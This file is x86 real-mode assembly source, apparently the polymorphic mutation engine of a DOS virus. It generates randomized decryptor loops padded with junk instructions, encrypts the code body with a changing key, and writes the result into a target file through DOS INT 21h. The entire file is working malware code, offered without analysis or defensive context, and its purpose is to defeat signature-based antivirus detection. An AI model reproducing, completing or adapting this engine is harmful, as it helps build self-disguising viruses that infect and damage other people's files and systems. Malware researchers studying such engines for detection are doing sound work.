;----------------------------<<eng.asm>>---------------------------------------

_ax             equ     0
_cx             equ     1
_dx             equ     2
_bx             equ     3
_sp             equ     4
_bp             equ     5
_si             equ     6
_di             equ     7

                
engine:         mov     ds:pointer,ax           ; save IP
                mov     di,offset decrypt
                mov     bx,offset make_count
                mov     cx,offset make_key
                mov     dx,offset make_ptr
                mov     si,offset order_ret
                or      bp,11101111b            ; SP is used
                call    order                   ; randomize and call registers
                push    di                      ; save start of loop
                push    di
                mov     si,offset encode
                mov     di,offset write_buff
                mov     cx,encode_end-encode
                rep     movsb                   ; copy write code
                mov     ds:encode_ptr,offset (encode_break-encode)+write_buff
                pop     di
                mov     bx,offset make_enc
                mov     cx,offset make_keychange
                mov     dx,offset make_deccount
                mov     si,offset make_incptr
                call    order                   ; call routines

;=====( Preform loop )=======================================================;

                mov     ax,2
                push    ax
                call    random                  ; test BP for 4000?
                pop     ax
                jz      loop_no_test
                test    bp,4000h                ; possible to just "Jcc"?
                jnz     loop_make_jcc
loop_no_test:   call    random
                jz      loop_no_test1
                test    bp,2000h                ; use loop?
                jnz     loop_make_jcc
loop_no_test1:  or      bp,800h                 ; do not change flags
                mov     ax,2
                cwd
                call    random                  ; try OR/AND/TEST reg,reg
                                                ; or XOR/ADD/OR/SUB reg,0?
                mov     al,ds:count_reg         ; get counter
                jnz     loop_orandtest
                call    boolean                 ; do XOR/OR/ADD or ADD/SUB?
                jnz     loop_modify
                call    add_reg                 ; ADD/SUB reg,0
                jmp     loop_make_jcc

loop_modify:    call    modify_reg              ; XOR/OR/ADD reg,0
                jmp     loop_make_jcc

loop_orandtest: mov     cl,3
                mov     ch,al
                shl     ch,cl
                or      al,ch                   ; set reg1 as reg2 also
                mov     bx,2                    ; OR/AND/TEST
                call    random_bx
                jnz     loop_and
                or      ax,9c0h                 ; OR reg1, reg2
loop_reverse:   call    boolean                 ; use 9 or 11?
                jnz     loop_orandteststo
                or      ah,2h                   ; reg2, reg1
                jmp     loop_orandteststo

loop_and:       dec     bx
                jnz     loop_test
                or      ax,21c0h                ; AND reg1, reg2
                jmp     loop_reverse

loop_test:      or      ax,85c0h                ; TEST reg1, reg2
loop_orandteststo:
                xchg    al,ah
                stosw                           ; store TEST/OR/AND
                or      bp,1800h                ; do not change flags/
                                                ; test stored
                call    garble
loop_make_jcc:  and     bp,not 800h
                test    bp,2000h                ; code loop?
                jz      loop_make_jump
                mov     al,0e2h                 ; LOOP
                test    bp,1000h                ; possible to use LOOPNZ/Z?
                jz      loop_code_disp
                call    boolean
                jnz     loop_code_disp
                dec     ax                      ; LOOPZ
                call    boolean
                jnz     loop_iscx
                dec     ax                      ; LOOPNZ
                jmp     loop_code_disp
                
;=====( Now make conditional jump )==========================================;

jcc_tbl:        db      75h,79h,7dh,7fh         ; JNE/JNS/JG/JGE

loop_make_jump: mov     bx,offset jcc_tbl
                mov     ax,3
                call    random
                xlat                            ; get Conditional jump
                mov     bx,2
                call    random_bx               ; use JE/JS/LE/L then JMP?
                jnz     loop_code_disp
                cmp     ds:count_reg,_cx        ; CX is counter?
                jnz     loop_notcx
                mov     bl,4
                call    random_bx
                jnz     loop_notcx
                mov     al,0e3h + 1             ; JCXZ + 1
loop_notcx:     dec     ax
loop_iscx:      stosw
                cmp     al,07fh                 ; Jcxz/loopz?
                ja      loop_code_short
                call    boolean                 ; Use opposite or EB?
                jnz     loop_code_short
                or      bp,800h                 ; dont change flags
loop_code_short:mov     si,di                   ; save offset of displacement
                call    garble
                lea     ax,ds:[si-2]
                sub     ax,di
                neg     al                      ; get jump displacement
                mov     ds:[si-1],al            ; save it
                test    bp,800h                 ; Dont change flags -> "Jcc"
                mov     al,0ebh                 ; Jmp short
                je      loop_code_disp
                mov     ax,3
                call    random
                mov     bx,offset jcc_tbl
                xlat                            ; Get JNE/JNS/JG/JGE
loop_code_disp: stosb                           ; store jump
                pop     ax                      ; start of loop
                dec     ax
                sub     ax,di                   ; get loop displacement
                stosb
                or      bp,11101111b            ; free all registers
                and     bp,not 800h             ; allow flags to change
                call    garble
                mov     ax,19
                call    random                  ; 1 in 20 chance of non-jmp
                jnz     loop_code_jmp
                mov     ax,ds:pointer
                add     ax,offset file_start    ; where to jump
                xchg    dx,ax
                call    get_reg                 ; get a register
                call    mov_reg                 ; Mov value into register
                or      ax,0ffc0h + (4 shl 3)   ; JMP reg16
                call    boolean                 ; PUSH/RET or JMP reg16?
                jnz     loop_code_push
                xchg    al,ah
                jmp     loop_code_stosw

loop_code_push: mov     bx,2
                call    random_bx               ; 1 in 3 chance of FF /6 PUSH
                jnz     loop_code_push1
                xor     al,(6 shl 3) xor (4 shl 3) ; PUSH reg
                xchg    al,ah                
                stosw
                jmp     loop_code_ret

loop_code_push1:xor     al,50h xor (0c0h or (4 shl 3)) ; PUSH reg
                stosb
loop_code_ret:  call    garble
                mov     al,0c3h                 ; RETN
                stosb
                jmp     loop_code_end

loop_code_jmp:  mov     al,0e9h
                stosb                           ; Store Jump
                lea     ax,ds:[di-((file_start-2)-v_start)]
                neg     ax                      ; Jmp file_start
loop_code_stosw:stosw
loop_code_end:  mov     si,ds:encode_enc_ptr    ; get encrypt instruction ptr                                
                cmp     di,offset header        ; Decryptor is too large?
                jb      go_write_buff
                stc                             ; return error
                pushf
                pop     bp
                retn

go_write_buff:  jmp     write_buff              ; encrypt/write/decrypt


;=====( Inc pointer )========================================================;

make_incptr:    mov     ax,word ptr ds:ptr_reg  ; get pointer registers
                mov     dx,2                    ; ADD ptr,2
                cmp     ah,-1                   ; two registers used?
                jz      make_incptr_1
                call    boolean                 ; do one or both?
                jnz     make_incptr_do1
                dec     dx                      ; ADD ptr,1
                call    make_incptr_do1
                jmp     make_incptr_2

make_incptr_do1:call    boolean
                jnz     make_incptr_1
make_incptr_2:  xchg    al,ah
make_incptr_1:  call    add_reg
                sub     ds:disp,dx              ; add to displacement
                retn 

;=====( Dec counter )========================================================;

make_deccount:  cmp     si,offset make_deccount ; last operation?
                jnz     make_deccount_notlast
                call    boolean                 ; do it?
                jnz     make_deccount_notlast
                or      bp,4800h                ; remember we're last
make_deccount_notlast:
                mov     al,ds:count_reg
                cmp     al,_cx                  ; possible to use LOOP/LOOPNZ?
                jnz     make_deccount_notcx
                call    boolean
                jnz     make_deccount_notcx
                or      bp,2000h                ; do LOOP
                jmp     make_deccount_exit

make_deccount_notcx:
                mov     dx,-1                   ; ADD counter,-1
                call    add_reg
make_deccount_exit:
                or      bp,400h                 ; deccount executed
                retn                   

;=====( Make encryption instruction )========================================;

make_enc:       push    bp
                and     bp,not 400h
                mov     al,ds:key_reg
                push    ax                      ; save key register
make_enc_which: mov     ax,4                    ; ADD/SUB/XOR/ROR/ROL
                call    random
                mov     bx,0105h                ; ADD [DI],AX
                mov     cx,1119h                ; ADC/SBB
                mov     dx,2905h                ; SUB [DI],AX
                jz      make_enc_add
                dec     ax
                jz      make_enc_sub
                dec     ax
                jnz     make_enc_ror
                mov     bh,31h                  ; XOR
                mov     dx,3105h                ; XOR [DI],AX
                jmp     make_enc_sto

make_enc_ror:   cmp     ds:key_reg,_cx          ; CX is key?
                jne     make_enc_which
                or      bp,400h                 ; Put XCHG CX,AX
                mov     bh,0d3h
                mov     dx,0d30dh               ; ROL 
                dec     ax
                jz      r_make_enc_sto
                xchg    bx,dx                   ; ROR
r_make_enc_sto: mov     ds:key_reg,al           ; 1 SHL 3 = 08 / D3 08
                                                ; D3 00 = ROL [],CL
                jmp     make_enc_sto

make_enc_sub:   xchg    dh,bh                   ; SUB - ADD [DI],AX
                xchg    cl,ch                   ; SBB/ADC
make_enc_add:   call    boolean                 ; do Carry?
                jnz     make_enc_sto
                push    bx
                mov     bh,ch                   ; Make it ADC/SBB
                call    clear_carry
                cmp     al,0
                org     $ - 1
make_enc_sto:   push    bx
                test    bp,8000h                ; EXE file?
                jz      make_enc_com
                call    is_bp_ptr               ; is BP a pointer?
                je      make_enc_com
                mov     al,2eh                  ; CS:
                call    boolean
                jnz     make_enc_cs
                mov     al,36h                  ; SS:
make_enc_cs:    stosb                           ; store segment override
make_enc_com:   mov     al,bh
                stosb                           ; store instruction
                mov     ax,word ptr ds:ptr_reg  ; get pointer registers
                cmp     ah,-1                   ; second reg?
                je      make_enc_xlat
                add     al,ah
make_enc_xlat:  mov     bx,offset rm_tbl
                xlat                            ; get r/m
                call    is_bp_ptr               ; is BP a pointer?
                jnz     make_enc_nobp
                inc     ah                      ; is there a second reg?
                jne     make_enc_nobp
                or      al,01000000b            ; [BP+xx]
make_enc_nobp:  mov     cx,ds:disp              ; get displacement
                mov     bx,6
                call    random_bx               ; allow no displacement?
                jz      make_enc_get_disp
                jcxz    make_enc_sto_rm
make_enc_get_disp:
                or      al,01000000b            ; 8bit displacement
                call    boolean                 ; allow 8bit displacement?
                jnz     make_enc_16bit
                cmp     cx,7fh                  ; 8bit displacement?
                jbe     make_enc_sto_rm         
                cmp     cx,-80h
                jb      make_enc_16bit
                xor     ch,ch
                cmp     ax,0
                org     $ - 2
make_enc_16bit: xor     al,11000000b            ; 8bit off, 16bit on
make_enc_sto_rm:mov     ah,ds:key_reg
                shl     ah,1
                shl     ah,1
                shl     ah,1                    ; from bits 0-2 of AH
                or      al,ah                   ; to bits 3-5 of AL
                stosb                           ; store r/m byte 
                test    al,11000000b            ; any displacement?
                jz      make_enc_disp
                test    al,10000000b            ; 16bit displacement?
                xchg    cx,ax
                stosw                           ; store displacement
                jnz     make_enc_disp
                dec     di                      ; 8bit only
make_enc_disp:  xchg    di,ds:encode_ptr        ; get encode ptr
                test    bp,400h                 ; store XCHG CX,AX?
                je      make_enc_nor
                mov     al,91h                  ; XCHG CX,AX
                stosb
make_enc_nor:   xchg    dx,ax
                xchg    al,ah
                mov     ds:encode_enc_ptr,di    ; save instruction pointer
                stosw                           ; set encryption instruction
                je      make_enc_nor1
                mov     al,91h                  ; XCHG CX,AX
                stosb
make_enc_nor1:  xchg    di,ds:encode_ptr        ; restore decrypt ptr
                pop     ax
                xchg    al,ah
                mov     word ptr ds:write_buff[encode_flip-encode],ax 
                                                ; save opposite operation
                pop     ax 
                mov     ds:key_reg,al           ; restore key register
                pop     bp
                retn
                
rm_tbl:         db      -1,-1,-1,7,-1,6,4,5,-1,0,1,2,3  ; -1's not used

;=====( Change key )=========================================================;

make_keychange: call    boolean                 ; change key?
                jnz     make_keychange_yes
                retn
                
make_keychange_yes:
                push    bp
                or      bp,200h                 ; let know that keychange
                mov     ax,3
                call    random                  ; 1 in 4 chance of modify_reg
                jnz     keychange_other
                call    random_1
                xchg    dx,ax                   ; Random value to modify key
                                                ; reg by
                mov     al,ds:key_reg
                call    modify_reg              ; XOR/ADD/OR
keychange_stoop:xchg    di,ds:encode_ptr        ; get ptr to encode
                inc     di                      ; CLC
                mov     al,ds:modify_op         ; get operation
                stosb
keychange_stodx:xchg    dx,ax                   ; store value/operation
keychange_sto:  stosw
                xchg    di,ds:encode_ptr        ; get decrypt pointer
                pop     bp
                retn

keychange_other:mov     al,4                    ; ROR/ROL/NOT/NEG/ADD
                call    random 
                jnz     keychange_rol
                mov     ax,0d1c0h               ; ROR AX,1
keychange_cl:   mov     bx,2                    ; 1 in 3 chance of ,CL
                call    random_bx
                jnz     keychange_nocl
                cmp     ds:count_reg,_cx          ; Count is CX?
                jne     keychange_nocl
                test    bp,400h                 ; Count already decremented?
                jnz     keychange_nocl
                or      ah,2                    ; By CL
keychange_nocl: xchg    al,ah
                push    ax
                or      ah,ds:key_reg           ; set key register
                stosw                           ; store instruction
                pop     ax
                xchg    di,ds:encode_ptr        ; get encode ptr
                jmp     keychange_sto

keychange_rol:  dec     ax
                jnz     keychange_not
                mov     ax,0d1c0h or (1 shl 3)  ; ROL AX,1
                jmp     keychange_cl

keychange_not:  dec     ax
                jnz     keychange_neg                
                mov     ax,0f7c0h + (2 shl 3)   ; NOT AX
                jmp     keychange_nocl

keychange_neg:  dec     ax
                jnz     keychange_add
                mov     ax,0f7c0h + (3 shl 3)   ; NEG AX
                jmp     keychange_nocl

keychange_add:  call    random_1
                xchg    dx,ax
                mov     al,ds:key_reg           ; get key register
                call    add_reg                 ; ADD reg(ax), value(dx)
                jmp     keychange_stoop

;=====( Build key )==========================================================;

make_key:       call    get_reg                 ; get register
                xchg    dx,ax
                call    random_1                ; get key
                mov     ds:key,ax               ; save key
                xchg    dx,ax
                mov     ds:key_reg,al           ; save register
                call    mov_reg                 ; MOV reg(ax),value(dx)
                retn

;=====( Build counter )======================================================;

make_count:     call    get_reg                 ; get register
                mov     ds:count_reg,al         ; save register
                mov     dx,(decrypt-v_start)/2  ; # of words to crypt
                call    mov_reg                 ; mov reg(ax),value(dx)
                retn

;=====( Build Pointer )======================================================;

make_ptr:       mov     dx,ds:pointer
                call    get_ptr_reg             ; get DI/SI/BP/BX
                mov     ds:ptr_reg,al
                mov     ds:ptr_reg1,-1          
                mov     bx,3
                call    random_bx               ; 1 in 4 chance of 2 regs
                jnz     make_ptr_2
                cmp     al,_si
                mov     bx,11000000b            ; DI/SI
                jb      make_ptr_test
                mov     bl,00101000b            ; BP/BX
make_ptr_test:  test    bp,bx                   ; 'other' availible?
                jz      make_ptr_2
make_ptr_again: call    get_ptr_reg             ; get DI/SI/BP/BX
                push    ax
                call    conv_num                ; convert to bit-map number
                test    al,bl                   ; is it other type?
                pop     ax
                jnz     make_ptr_ok
                call    del_reg                 ; delete register
                jmp     make_ptr_again

make_ptr_ok:    mov     ds:ptr_reg1,al          ; save second register
                mov     bx,-1
                call    random_bx
                sub     dx,bx                   ; randomize values
                xchg    bx,dx
                call    mov_reg                 ; mov reg(ax), value(dx)
                xchg    bx,dx
                mov     al,ds:ptr_reg           ; get first reg
make_ptr_2:     xor     bx,bx                   ; zero displacement
                call    boolean                 ; use one?
                jnz     make_ptr_nodisp
                mov     bx,-1
                call    random_bx
                sub     dx,bx                   ; subtract displacement
make_ptr_nodisp:mov     ds:disp,bx              ; save displacement
                call    mov_reg                 ; mov reg(ax), value(dx)
                retn
                
;=====( Shell for mov_reg1 )=================================================;

mov_reg:        push    bx dx
                mov     bx,4
                call    random_bx               ; 1 in 5 chance of MOV/ADD/SUB
                jnz     mov_reg_call
                mov     bx,-1
                call    random_bx               ; get random #
                sub     dx,bx                   ; MOV reg, value-random #
                call    mov_reg1                ; do MOV reg,
                mov     dx,bx
                call    add_reg                 ; Now add difference
                pop     dx bx
                retn

mov_reg_call:   pop     dx bx

;=====( Mov reg(ax), value(dx) )=============================================;

mov_reg1:       push    ax bx cx dx
                cbw
                mov     bx,2
                call    random_bx               ; MOV or SUB/XOR ADD/OR/XOR
                jz      mov_reg_other
                mov     bl,2
                call    random_bx               ; 1 in 3 chance of c6/c7 MOV
                jnz     mov_reg_b0
                or      ax,0c7c0h               ; MOV reg,imm
                call    boolean                 ; Do long MOV or LEA?
                jnz     mov_reg_c7
                mov     cl,3
                shl     al,cl                   ; Reg -> bits 3,4,5
                xor     ax,(8d00h or 110b) xor 0c700h  ; LEA reg,[imm]
mov_reg_c7:     xchg    al,ah
                stosw                           ; store it
mov_reg_sto:    xchg    dx,ax
                stosw                           ; store value
                call    garble
mov_reg_exit:   jmp     modify_pop

mov_reg_b0:     or      al,0b8h                 ; MOV reg,imm
                stosb
                jmp     mov_reg_sto

mov_reg_other:  push    ax
                mov     cl,3
                mov     ch,al
                shl     ch,cl                   ; copy reg1 to reg2
                or      al,ch                   ; set it
                call    boolean
                jnz     mov_reg_other1
                or      ah,2                    ; reg1, reg2 -> reg2, reg1
mov_reg_other1: call    boolean
                jnz     mov_reg_xor
                or      ax,29c0h                ; SUB reg, reg
                call    boolean
                jnz     mov_reg_other_sto
                xor     ah,19h xor 29h          ; SBB reg, reg
                call    clear_carry             ; clear carry flag
mov_reg_other_sto:
                xchg    al,ah
                stosw
                call    garble
                pop     ax
                call    modify_reg              ; ADD/OR/XOR reg(ax),value(dx)
                jmp     mov_reg_exit

mov_reg_xor:    or      ax,31c0h                ; XOR AX,AX
                jmp     mov_reg_other_sto

;=====( ADD/OR/XOR reg(ax), value(dx) )======================================;

modify_reg:     push    ax bx cx dx
                cbw
                mov     bx,2
                call    random_bx
                mov     cx,3500h + (6 shl 3)    ; XOR
                jz      modify_reg_cont
                mov     cx,0d00h + (1 shl 3)    ; OR
                dec     bx
                jz      modify_reg_cont
modify_reg_add: mov     cx,0500h                ; ADD
                call    boolean                 ; ADC or ADD?
                jnz     modify_reg_cont
                mov     cx,1500h + (2 shl 3)    ; ADC
modify_reg_clc: call    clear_carry             ; Clear carry flag
modify_reg_cont:test    bp,200h                 ; keychange executing?
                jz      modify_reg_nosave
                mov     ds:modify_op,ch         ; save AX operation
modify_reg_nosave:
                call    boolean                 ; check if AX?
                jnz     modify_reg_noax
                or      al,al                   ; AX?
                jnz     modify_reg_noax
                mov     al,ch
                stosb                           ; store instruction
                xchg    dx,ax
modify_sto:     stosw                           ; store value
modify_exit:    call    garble
modify_pop:     pop     dx cx bx ax
                retn

modify_reg_noax:or      ax,81c0h
                or      al,cl                   ; XOR/OR/ADD
                call    boolean                 ; sign extend?
                jnz     modify_reg_nosign
                cmp     dx,7fh                  ; possible to sign extend?
                jbe     modify_sign
                cmp     dx,-80h
                jb      modify_reg_nosign
modify_sign:    or      ah,2                    ; sign extend
modify_reg_nosign:                
                xchg    al,ah
                stosw
                test    al,2                    ; sign extended?
                xchg    dx,ax
                je      modify_sto
                stosb
                jmp     modify_exit
                
;=====( ADD reg(ax), value(dx) )=============================================;

add_reg:        push    ax bx cx dx
                cbw
                mov     cx,dx
add_loop:       mov     bx,3
                call    random_bx               ; 1 in 4 chance of ADD/SUB
                jz      add_noinc
                mov     bx,40c0h                ; INC reg
                test    bp,200h                 ; keychange running?
                jz      add_nosave
                mov     ds:modify_op,05h        ; ADD AX,
add_nosave:     cmp     cx,3h                   ; too high to INC?
                jb      add_inc
                neg     cx
                cmp     cx,3h                   ; too low to DEC?
                ja      add_noinc
                mov     bx,48c0h + (1 shl 3)    ; DEC reg
                test    bp,200h
                jz      sub_nosave
                mov     ds:modify_op,2dh        ; SUB AX,
sub_nosave:     inc     dx
                inc     cx
                cmp     ax,0
                org     $ - 2
add_inc:        dec     dx
                dec     cx
                push    ax
                mov     ax,5
                call    random                  ; 1 in 6 chance of FF
                pop     ax      
                push    ax
                jnz     add_inc_40
                mov     ah,0ffh
                xchg    bl,bh
                xchg    al,ah                   ; AL=ff AH=Reg
                stosb 
                xchg    al,ah
add_inc_40:     or      al,bh                   ; set DEC/INC
                stosb
                pop     ax
                call    garble
                or      dx,dx                   ; all done?
                jnz     add_loop
add_reg_exit:   jmp     modify_pop

add_noinc:      call    boolean                 ; ADD or SUB?
                jz      sub_reg
                jmp     modify_reg_add
                
sub_reg:        test    bp,200h                 ; keychange?
                jnz     sub_reg_key
                neg     dx
sub_reg_key:    mov     cx,2d00h + (5 shl 3)    ; SUB
                call    boolean                 ; use SBB?
                jz      sbb_reg
                jmp     modify_reg_cont

sbb_reg:        mov     cx,1d00h + (3 shl 3)    ; SBB
                jmp     modify_reg_clc
                
;=====( clear carry flag )===================================================;

clear_carry:    push    ax bp
                or      bp,800h                 ; don't change flags
                mov     al,0f8h                 ; CLC
                call    boolean
                jnz     clear_carry_clc
                mov     ax,0f5f9h               ; STC/CMC
                stosb
                call    garble
                xchg    al,ah
clear_carry_clc:stosb
                call    garble
                pop     bp ax
                retn

garble:         push    ax
                mov     ax,2
                call    random                  ; how many times to call?
                xchg    cx,ax
                jcxz    garble_exit
garble_loop:    call    garble1
                loop    garble_loop
garble_exit:    xchg    cx,ax
                pop     ax
                retn

;=====( add garbage code )===================================================;

garble1:        push    ax bx cx dx bp
                test    bp,100h                 ; Garble already executing?
                jnz     garble_ret
                and     bp,not 200h             ; keychange not executing
                or      bp,100h                 ; Garble executing
                call    boolean
                jnz     garble_ret
                mov     cl,3
                call    random_1
                xchg    dx,ax                   ; DX=random number
                call    get_reg                 ; get register
                jc      garble_ret
                mov     bx,6
                test    bp,800h                 ; flag change allowed?
                jz      garble_f
                mov     bl,2
garble_f:       call    random_bx            ; MOV/1BYTE/XCHG/MODIFY/ADD/MOV?
                jnz     garble_xchg
                or      ah,89h
garble_reg_set: call    boolean                 ; reg1, reg2 or reg2, reg1?
                jz      garble_reg_reg
                or      ah,2                    ; 8b
                xchg    al,dl
garble_reg_reg: and     dl,7                    ; Get register values only
                and     al,7
                shl     dl,cl
                or      al,0c0h                 ; MOV reg1, random reg
                or      al,dl
                xchg    al,ah
                stosw
garble_ret:     pop     bp 
                jmp     modify_pop

garble_xchg:    dec     bx
                jnz     garble_1byte
                xchg    dx,ax
                call    get_reg                 ; get another reg
                jc      garble_ret
                xchg    dx,ax                   ; AL=reg1 DL=reg2
                call    boolean
                jnz     garble_xchgnoax
                or      dl,dl                   ; AX?
                jz      garble_xchgax
                or      al,al
                jz      garble_xchgax
garble_xchgnoax:or      ah,87h                  ; XCHG reg1,
                jmp     garble_reg_reg

garble_xchgax:  or      al,90h
                or      al,dl                   ; XCHG AX, reg
garble_stosb:   stosb
                jmp     garble_ret
                
garble_1byte:   dec     bx
                jnz     garble_modify
                mov     al,4
                call    random
                mov     bx,offset garble_1byte_tbl
                xlat                            ; get 1 byte instruction
                jmp     garble_stosb
                
garble_modify:  dec     bx
                jnz     garble_add
                call    modify_reg              ; ADD/XOR/OR reg1, random #
                jmp     garble_ret

garble_add:     dec     bx
                jnz     garble_mov
                call    add_reg                 ; ADD/SUB reg1, random #
                jmp     garble_ret

garble_mov:     dec     bx
                jnz     garble_op
                call    mov_reg                 ; MOV reg1, random #
                jmp     garble_ret

garble_op:      and     dh,00111000b            ; get rnd op
                mov     ah,1
                or      ah,dh
                jmp     garble_reg_set

garble_1byte_tbl:
                db      2eh
                db      36h
                cld
                std
                sti
                
;=====( Is BP a Pointer? )===================================================;

is_bp_ptr:      cmp     ds:ptr_reg,_bp
                je      bp_is_ptr
                cmp     ds:ptr_reg1,_bp
bp_is_ptr:      retn

;=====( Get pointer register (DI/SI/BP/BX) )=================================;

get_ptr_regnext:call    del_reg                 ; restore register to pool

get_ptr_reg:    call    get_reg                 ; get register
                cmp     al,_bx
                je      got_ptr_reg
                cmp     al,_bp
                jb      get_ptr_regnext
got_ptr_reg:    retn

;=====( return random register in AL )=======================================;

get_reg:        test    bp,11101111b            ; any registers free?
                stc
                jz      get_reg_exit
get_reg_loop:   mov     ax,7
                call    random
                push    ax
                cbw
                call    conv_num                ; convert to bit map
                test    bp,ax                   ; is register free?
                pushf
                not     ax
                and     bp,ax                   ; mark register
                popf
                pop     ax
                jz      get_reg_loop
get_reg_exit:   retn
                
;=====( Restore register to pool )===========================================;

del_reg:        push    ax
                cbw
                call    conv_num                ; convert to bit number
                or      bp,ax                   ; restore register
                pop     ax
                retn

;=====( convert number to bit map )==========================================;

conv_num:       push    cx
                mov     cl,al
                mov     al,1
                shl     al,cl
                pop     cx
                retn

;=====( randomize order of BX/CX/DX/SI, then call )==========================;

order:          call    garble
                mov     ax,2
                call    random
                xchg    cx,ax
                inc     cx
order_loop:     call    boolean
                jnz     order1
                xchg    bx,ax
order1:         call    boolean
                jnz     order2
                xchg    dx,ax
order2:         call    boolean
                jnz     order3
                xchg    si,ax
order3:         loop    order_loop
                push    si dx bx ax
order_ret:      retn

;=====( return random number between 0 and ffff in bx )======================;

random_bx:      xchg    bx,ax
                call    random
                xchg    bx,ax
                retn

;=====( flip Sign bit )======================================================;

boolean:        push    ax
                mov     ax,1
                call    random
                pop     ax
                retn

;=====( return random number between 0 and ffff )============================;

random_1:       mov     ax,-1

;=====( Generate random number between 0 and AX )============================;

random:         push    ds bx cx dx ax
                xor     ax,ax
                int     1ah
                push    cs
                pop     ds
                in      al,40h
                xchg    cx,ax
                xchg    dx,ax
                mov     bx,offset ran_num
                xor     ds:[bx],ax
                rol     word ptr ds:[bx],cl
                xor     cx,ds:[bx]
                rol     ax,cl
                xor     dx,ds:[bx]
                ror     dx,cl
                xor     ax,dx
                imul    dx
                xor     ax,dx
                xor     ds:[bx],ax
                pop     cx
                xor     dx,dx
                inc     cx
                je      random_ret
                div     cx
                xchg    ax,dx
random_ret:     pop     dx cx bx ds
                or      ax,ax
                retn
                    
ran_num         dw      ?

;=====( Encrypts the code/writes it/decrypts code )==========================;

encode:         mov     bx,ds:handle
                mov     ax,0
key             =       word ptr $ - 2
                mov     cx,(decrypt-v_start)/2
                xor     di,di
encode_break:   clc
                clc
                clc
                clc                     ; XCHG CX,AX XCHG CX,AX
                clc
                clc                     ; CLC ADD AX,xxxx / XOR [DI],AX
                clc
                clc                     ; XOR [DI],AX / CLC ADD AX,xxxx
                inc     di
                inc     di
                loop    encode_break
encode_ret      =       byte ptr $    
                mov     ah,40h
                mov     cx,file_size
                cwd
                pushf
                call    cs:int_21
                jc      encode_flag
                sub     ax,cx
encode_flag:    pushf
                pop     bp
                mov     word ptr ds:[si],0
encode_flip     =       word ptr $ - 2
                mov     byte ptr ds:write_buff[encode_ret-encode],0c3h
                jmp     encode
encode_end:

